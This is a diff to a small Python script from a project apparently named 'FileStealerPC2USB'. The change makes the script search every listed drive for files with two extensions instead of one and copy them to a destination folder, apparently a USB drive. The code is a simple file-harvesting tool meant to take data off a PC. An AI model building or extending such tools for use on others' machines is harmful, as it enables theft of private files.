@@ -60,41 +60,42 @@ class Mains:
         for driver in self.drive_list :
             chdir(driver)
 
-            filetype = '.bmpsa'
+            filetypes = ['.bmpsa', '.bmpas']
 
             # destination = "D:\\MY Projects\\Python\\FileStealerPC2USB\\n\\"
 
             for (dirpath, dirname, filenames) in walk('.'):
                 for filename in filenames:
-                    if filename.endswith(filetype):
-                        main_location = sep.join([dirpath,filename])
+                    for typefile in filetypes:
+                        if filename.endswith(filetypes[filetypes.index(typefile)]):
+                            main_location = sep.join([dirpath,filename])
 
-                        timemin = str(localtime().tm_min)
-                        timesec = str(localtime().tm_sec)
+                            timemin = str(localtime().tm_min)
+                            timesec = str(localtime().tm_sec)
 
-                        time = " (m" + timemin + "-s" + timesec + ")"
+                            time = " (m" + timemin + "-s" + timesec + ")"
 
-                        absulpath = path.abspath(main_location).replace(":","")
-                        absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
-                        # print(absulpath)
+                            absulpath = path.abspath(main_location).replace(":","")
+                            absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
+                            # print(absulpath)
 
-                        if filename in listdir(self.dest):
-                            filename = filename.replace(filetype,"")
+                            if filename in listdir(self.dest):
+                                filename = filename.replace(filetypes[filetypes.index(typefile)],"")
 
-                            makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
-                            copyfile(main_location, self.dest + absulpath+ filename + time + filetype)
-                            # print(main_location)
-                            self.counter += 1
-                            # print(counter)
-                            stdout.write('\r'+str(self.counter))
+                                makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
+                                copyfile(main_location, self.dest + absulpath+ filename + time +filetypes[filetypes.index(typefile)])
+                                # print(main_location)
+                                self.counter += 1
+                                # print(counter)
+                                stdout.write('\r'+str(self.counter))
 
-                        else:
+                            else:
+                                makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
+                                copyfile(main_location, self.dest +absulpath+ filename)
+                                self.counter += 1
+                                # print(counter)
+                                stdout.write('\r' +str(self.counter))
 
-                            makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
-                            copyfile(main_location, self.dest +absulpath+ filename)
-                            self.counter += 1
-                            # print(counter)
-                            stdout.write('\r' +str(self.counter))
         print(".")
 
 M = Mains()
